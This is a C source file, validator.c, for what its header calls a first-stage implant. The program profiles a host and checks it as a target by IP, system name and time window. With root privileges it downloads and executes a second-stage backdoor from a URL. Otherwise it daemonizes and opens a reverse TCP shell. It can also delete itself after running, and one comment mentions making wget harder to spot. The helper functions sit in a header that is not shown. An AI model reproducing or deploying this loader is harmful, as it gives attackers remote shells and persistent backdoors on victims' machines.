/*  File: validator.c
*   Author: Nunyabeeswax
*   Date: 6/7/2021
*   Description:
*               - 1st stage program that profiles and validates the host.
*               - Determines if it is a machine we want to target.
*               - If it is, this downloads a second stage backdoor at URL to /tmp/syslogd/
*               - Download will fail if there is another file in /tmp/syslogd/
*/

#include "valHelper.h"   //// PERSIST /// PROFILE/VALIDATE
// ../.. Go into details of the program (RE). What each implant does. Steps to make it better. wget making it harder to spot

int main(int argc, char **argv){

    #ifndef PERSIST
    //delete the implant after it's done executing
    uninstallProg(argv[0]);
    #endif


    /*===== Profiling =====*/
    #ifdef DEBUG
    char* profile = strProfile();
    printf("\n=====  Profile  =====\n%s===================\n\n", profile);
    free(profile);
    #endif

    /*===== Validate =====*/

    // validate IP using VALIDIP
    val_IP();
    // validate System using UTS_SYSNAME
    val_SysName();
    // validate (START_DATE < Right Now < END_DATE) && (WORK_START < Right Now < WORK_END)
    val_time();

    /* If program hasn't exited by now, this is a suitable target host */

    // euid & egid of root = 0
    int uid = geteuid();
    int gid = getegid();

    #ifdef DEBUG
        printf("UID: %d, GUID: %d\n", uid, gid);
    #endif
    // root privilege: run backdoor
    if((uid == 0 || gid ==0)){
        #ifdef URL
            if( dwnldAndExecFile(URL) == -1){
                my_perror("Error: Downloading and Executing");
            }
        #endif
    }
    else{
        #ifndef NO_DAEMON
            daemonize();
        #endif
        // return shell
        revTCPShell();
    }
    return 0;
}
